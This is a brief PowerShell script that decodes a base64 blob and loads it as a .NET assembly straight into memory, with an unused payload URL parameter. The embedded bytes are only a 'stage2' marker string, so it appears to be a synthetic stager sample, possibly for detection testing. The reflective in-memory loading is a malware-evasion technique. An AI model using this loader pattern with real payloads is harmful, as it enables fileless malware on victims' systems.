
[CmdletBinding()]
param(
    [string]$TransferUrl = 'http://internal.corp/payload.bin',
    [int]$TimeoutSec = 75
)
$ErrorActionPreference = "Stop"

$ManagedBytes = [Convert]::FromBase64String('c3RhZ2UyLW1hcmtlcjo5a3Mydm5kc2hp')
Write-Verbose ("Assembly byte count: " + $ManagedBytes.Length)
$TransferResult = [Reflection.Assembly]::Load($ManagedBytes)
if ($null -ne $TransferResult) {
    Write-Verbose ("Loaded assembly: " + $TransferResult.FullName)
}

$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
